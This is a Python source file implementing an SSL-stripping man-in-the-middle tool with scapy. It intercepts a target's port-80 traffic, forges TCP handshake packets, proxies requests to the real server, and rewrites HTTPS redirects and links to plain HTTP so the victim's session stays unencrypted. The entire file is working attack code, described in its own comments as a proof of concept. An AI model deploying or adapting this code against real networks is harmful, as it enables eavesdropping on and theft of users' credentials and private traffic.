import socket
import ssl
import threading
import re
from scapy.layers.inet import IP, TCP
from scapy.layers.http import HTTPRequest, HTTPResponse
import scapy.all as sc

class SSLStripFilter:
    """
    A packet-level SSL stripping filter.
    Intercepts victim HTTP requests (Port 80),
    Proxies them to the server (upgrading to HTTPS if needed),
    And rewrites responses to downgrade HTTPS links to HTTP.
    """

    def __init__(self, victim_ip, logger):
        self.victim_ip = victim_ip
        self.logger = logger
        # Map (victim_port) -> { 'server_sock': socket, 'server_ip': ip, 'ssl': bool, 'seq': int, 'ack': int }
        self.sessions = {} 
    
    def __call__(self, packet):
        # Only handle TCP packets
        if not packet.haslayer(TCP):
            return False

        ip = packet[IP]
        tcp = packet[TCP]

        # Only intercept traffic going OUT from the victim
        if ip.src != self.victim_ip:
            return False

        # Intercept HTTP (Port 80)
        if tcp.dport == 80:
            return self.handle_client_packet(packet)

        return False

    def handle_client_packet(self, packet):
        ip = packet[IP]
        tcp = packet[TCP]
        victim_port = tcp.sport
        
        # 1. Handle New Connection (SYN)
        if tcp.flags == 'S':
            self.logger(f"[SSLStrip] New connection from {self.victim_ip}:{victim_port} to {ip.dst}:80")
            self.sessions[victim_port] = {
                'server_ip': ip.dst,
                'server_sock': None,
                'ssl': False,
                'victim_seq': tcp.seq + 1,
                'victim_ack': 0,
                'my_seq': 1000 # Random start
            }
            # Send SYN-ACK
            self.send_syn_ack(packet)
            return True # Packet handled, do not forward

        # 2. Handle Data / ACK
        if victim_port in self.sessions:
            session = self.sessions[victim_port]
            
            # Update ACK from victim (they are acking our data)
            session['victim_ack'] = tcp.ack

            # If PSH or FIN, handle data
            if tcp.flags & 0x18 or len(tcp.payload) > 0: # PSH or FIN or just data
                payload = bytes(tcp.payload)
                if payload:
                    # Update expected seq from victim
                    session['victim_seq'] += len(payload)
                    self.handle_http_request(session, payload, packet)
                
                # We should ACK their data
                self.send_ack(packet, session)
                return True
            
            return True # Swallow ACKs to keep connection alive locally

        return False

    def send_syn_ack(self, packet):
        ip = packet[IP]
        tcp = packet[TCP]
        session = self.sessions[tcp.sport]
        
        syn_ack = IP(src=ip.dst, dst=ip.src) / \
                  TCP(sport=tcp.dport, dport=tcp.sport, flags="SA", seq=session['my_seq'], ack=tcp.seq + 1)
        sc.send(syn_ack, verbose=0)
        session['my_seq'] += 1

    def send_ack(self, packet, session):
        ip = packet[IP]
        tcp = packet[TCP]
        ack = IP(src=ip.dst, dst=ip.src) / \
              TCP(sport=tcp.dport, dport=tcp.sport, flags="A", seq=session['my_seq'], ack=session['victim_seq'])
        sc.send(ack, verbose=0)

    def handle_http_request(self, session, payload, packet):
        # 1. Connect to server if not connected
        if not session['server_sock']:
            try:
                # Default to HTTP initially
                s = socket.create_connection((session['server_ip'], 80))
                session['server_sock'] = s
                
                # Start a thread to read from server
                t = threading.Thread(target=self.server_loop, args=(session, packet))
                t.daemon = True
                t.start()
            except Exception as e:
                self.logger(f"[SSLStrip] Failed to connect to server: {e}")
                return

        # 2. Forward Request
        try:
            # Rewrite headers to prevent compression (so we can replace text easily)
            payload = payload.replace(b"Accept-Encoding: gzip", b"Accept-Encoding: identity")
            session['server_sock'].sendall(payload)
        except Exception as e:
            self.logger(f"[SSLStrip] Failed to send to server: {e}")

    def server_loop(self, session, original_packet):
        sock = session['server_sock']
        while True:
            try:
                data = sock.recv(8192)
                if not data: break
                
                # --- SSL STRIP LOGIC ---
                
                # 1. Intercept Redirects to HTTPS
                if b"Location: https://" in data:
                    self.logger("[SSLStrip] Detected HTTPS Redirect! Stripping...")
                    data = data.replace(b"Location: https://", b"Location: http://")
                    
                    # In a real attack, we would now upgrade 'sock' to SSL for future requests
                    # But for this flow, we just strip the redirect so the user stays on HTTP.
                    # The next request from user will come to port 80, and we will proxy again.

                # 2. Rewrite Body Links (https:// -> http://)
                # This is a naive replacement, but works for PoC
                data = data.replace(b"https://", b"http://")
                
                # -----------------------

                # Send to victim
                self.send_to_victim(session, data, original_packet)
            except Exception as e:
                self.logger(f"[SSLStrip] Server loop error: {e}")
                break
        
        # Close session
        if session['server_sock']:
            session['server_sock'].close()

    def send_to_victim(self, session, data, original_packet):
        ip = original_packet[IP]
        tcp = original_packet[TCP]
        
        # Chunking might be needed if data is large, but Scapy handles some.
        # We send PSH+ACK
        
        pkt = IP(src=ip.dst, dst=ip.src) / \
              TCP(sport=tcp.dport, dport=tcp.sport, flags="PA", seq=session['my_seq'], ack=session['victim_seq']) / \
              data
              
        sc.send(pkt, verbose=0)
        session['my_seq'] += len(data)